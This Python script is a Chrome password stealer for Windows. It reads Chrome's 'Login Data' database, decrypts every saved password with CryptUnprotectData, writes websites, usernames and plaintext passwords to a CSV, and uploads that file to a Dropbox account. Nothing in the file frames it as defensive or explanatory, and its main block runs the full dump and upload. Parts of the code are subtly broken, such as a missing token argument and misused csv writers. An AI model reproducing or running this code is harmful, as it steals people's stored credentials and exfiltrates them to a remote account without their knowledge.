import os
import csv
import _sqlite3
import dropbox
import win32crypt

from typing import Union
from io import StringIO
from dropbox.files import WriteMode


"""

"""
class ChromeRecord:
    def __init__(self, website, username, password):
        """
        Create a new account record
        :param website: The website that the information is saved for
        :param username: The username stored for the website
        :param password: The password associated with the username
        """

        self.website: str = website
        self.username: str= username
        self.password:str = password

    def __str__(self) -> str:
        """
        A string representation of ChromeRecord
        :return: None
        """
        rep = str("===New Account Record==="
               "Website: {}"
               "Username: {}"
               "Password {}\n").format(self.website,
                                       self.username,
                                       self.password)

        return rep

class ChromeAccountDatabase:
    def __init__(self, db_path=None):
        """
        Loads, exctracts, and writes data from the chrome account database file.
        :param db_path: An optional path the file
        """
        self.db_path = None
        self.set_sqlite_path(db_path)

        # Holds the account records
        self.records: list = list()
        # Turn the database into a list of ChromeRecord objects
        self.parse_database()

    def __str__(self) -> str:
        """
        Prints all of the account information
        :return: None
        """
        head = "===Chrome Account Database===\n\n"
        body =("   Website         |   Username         |    Password\n"
              "{}                 {}                   {}\n")
        representation = head
        for record in self.records:
            record_line = body.format(record.website, record.username, record.password)
            representation += record_line

        return representation


    def set_sqlite_path(self, db_path=None) -> None:
        """
        Gets the full path to the sqlite file that holds the saved user information.
        :param db_path: An optional parameter for the path to the chrome database file
        :return:
        """

        # Attempt to locate the local app data folder
        app_data = os.getenv('localappdata')
        if app_data is None:
            raise ValueError("Unable to locate the user's appdata")

        # Create the full path to the database
        if not db_path:
            db_path = os.path.join(app_data, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if not os.path.isfile(db_path):
            raise ValueError("Failed to locate the Chrome database file.")
        self.db_path = db_path

    def parse_database(self) -> None:
        """
        Extracts the account information from the sqllite database file. Also handles obtaining
        the password in plaintext.

        :raises: sqlite3.OperationalError
        :return: None
        """
        # Establish a connection to the database
        connection: _sqlite3.Connection = _sqlite3.connect(self.db_path)
        with connection:
            # Create a cursor for command executions
            cursor: _sqlite3.Cursor = connection.cursor()
            # Create a SQL query to select the relevant information
            query: str = "SELECT origin_url, username_value, password_value FROM logins"
            # Execute the query and get the results
            query_result = cursor.execute(query).fetchall()
            # Decrypt the password and store the results
            for website, username, password in query_result:
                # CryptUnprotectData returns a tuple, (encrypted, decrypted) so take [1]
                try:
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]
                    self.records.append(ChromeRecord(website, username, str(password) ))
                except Exception as e:
                    pass

    def to_csv(self, file_path: str = "chrome_accounts.csv", as_stream=False) -> Union[None, StringIO]:
        """
        Writes the account information to a csv file.

        :param file_path: A path including the filename of the csv
        :param as_stream:
        :return: None if the file was written, StringIO if requested as a stream
        """
        csv_stream: StringIO = StringIO()
        # Write the header
        csv.writer(csv_stream).writerows('Website,Username,Password \n')

        for record in self.records:
            csv_line = "{},{},{}\n".format(record.website, record.username, record.password)
            csv.writer(csv_stream).writerows(csv_line)

        if as_stream:
            return csv_stream

        with open(file_path, 'wb') as csv_file:
            # Write to the file
            csv.writer(csv_file).writerows(csv_stream)

    def to_dropbox(self, auth_token: str) -> bool:
        """
        Uploads the CSV representation to a dropbox account
        :param auth_token:
        :return:
        """
        dbx = dropbox.Dropbox(auth_token)

        # Throws if the account can't be validated
        dbx.users_get_current_account()

        csv_stream: StringIO = self.to_csv(as_stream=True)
        # Upload to dropbox in csv format. This throws dropbox.exceptions.ApiError
        dbx.files_upload(csv_stream.read().encode('utf-8'), 'chrome-accounts.csv', mode=WriteMode('overwrite'))
        return True

if __name__ == "__main__":
    # Create a database object
    chrome_database = ChromeAccountDatabase()

    # Print all of the accounts in the database
    print(chrome_database)

    # Write all of the accounts to a csv
    chrome_database.to_csv()

    # Upload all of the accounts to dropbox
    chrome_database.to_dropbox()
